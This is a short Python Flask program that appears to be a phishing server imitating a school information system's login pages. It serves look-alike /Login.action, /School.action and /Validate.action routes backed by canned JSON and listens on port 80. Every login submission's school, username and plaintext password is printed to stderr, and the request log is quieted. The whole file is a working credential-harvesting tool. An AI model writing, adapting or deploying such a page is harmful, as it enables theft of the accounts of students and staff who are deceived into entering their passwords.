from flask import Flask, render_template, jsonify, session, request, redirect
import json, os, logging, sys

app = Flask(__name__)
app.secret_key = os.urandom(0x20)

log = logging.getLogger('werkzeug')
log.setLevel(logging.ERROR)

id2school = {} 
for data_list in json.loads(open('data/school_action.json').read())['parameterMap']['list']:
    for data in data_list['s']:
        id2school[data['s']] = data['n']


@app.route('/')
def index():
    return redirect('/Login.action')


@app.route('/Login.action', methods=['GET', 'POST'])
def login_action():
    if request.method == 'POST':
        print('===========================', file=sys.stderr)
        print(f'School   : {id2school[request.form.get("schNo")]}', file=sys.stderr)
        print(f'Username : {request.form.get("loginId")}', file=sys.stderr)
        print(f'Password : {request.form.get("password")}', file=sys.stderr)
    return render_template('index.html')


@app.route('/School.action', methods=['POST'])
def school_action():
    return jsonify(json.loads(open('data/school_action.json').read()))


@app.route('/Validate.action', methods=['POST'])
def validate_action():
    validate_id = session.get('validate_id', -1)
    validate_id = (validate_id + 1) % 6
    session['validate_id'] = validate_id

    return jsonify(json.loads(open(f'data/validate_action{validate_id}.json').read()))


if __name__ == '__main__':
    app.run(debug=False, host='0.0.0.0', port=80)